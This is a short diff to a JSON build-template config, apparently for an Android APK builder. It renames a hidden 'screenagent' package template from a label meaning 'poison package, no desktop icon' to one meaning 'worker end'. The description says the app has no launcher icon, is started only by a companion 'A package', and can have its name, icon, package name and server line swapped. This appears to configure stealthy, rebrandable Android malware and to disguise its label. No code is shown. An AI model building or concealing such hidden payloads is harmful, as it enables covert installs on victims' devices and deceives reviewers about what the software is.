@@ -2,14 +2,14 @@
   "templates": [
     {
       "id": "src-2.1",
-      "name": "v2.1 · B 包（毒包·无桌面）",
+      "name": "v2.1 · B 包（工作端）",
       "versionName": "2.1",
       "versionCode": 210,
       "sourceDir": "apk-project/project",
       "kind": "screenagent",
       "visibleLauncher": false,
       "resourceStyle": "semantic",
-      "description": "从 apktool smali 工程源码编译：无桌面图标（装完只能由 A 包拉起），应用名/图标/版本/包名/线路均可改，构建时去掉 LAUNCHER intent-filter。"
+      "description": "从 apktool smali 工程源码编译：工作端无桌面图标（装完由 A 包拉起），应用名/图标/版本/包名/线路均可改，构建时去掉 LAUNCHER intent-filter。"
     },
     {
       "id": "installer-1.3.1",
